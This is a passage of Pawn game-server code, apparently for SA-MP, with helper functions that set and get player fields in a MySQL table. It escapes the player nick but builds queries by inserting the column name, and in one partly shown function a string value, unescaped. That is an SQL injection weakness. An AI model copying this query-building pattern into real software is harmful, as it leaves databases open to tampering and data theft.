	format(string2, sizeof(string2), "update players set %s='%s' where nick='%s'", key, value, nick);
	mysql_query(string2);

	return 1;
}

stock mysql_PlayerIntSet(player[], key[], value) {
	new nick[30], string2[300];

	mysql_real_escape_string(player, nick);

	format(string2, sizeof(string2), "update players set %s='%d' where nick='%s'", key, value, nick);
	mysql_query(string2);

	return 1;
}

stock mysql_PlayerGetInt(player[], key[]) {
	new tmpres;

	new nick[30], string2[300];
	mysql_real_escape_string(player, nick);

	format(string2, sizeof(string2), "select %s from players where nick='%s'", key, nick);
	mysql_query(string2);

	mysql_store_result();
	if(!mysql_num_rows())
	{
		mysql_free_result();
		return 0;
	}
	tmpres = mysql_fetch_int();
	mysql_free_result();

	return tmpres;
}
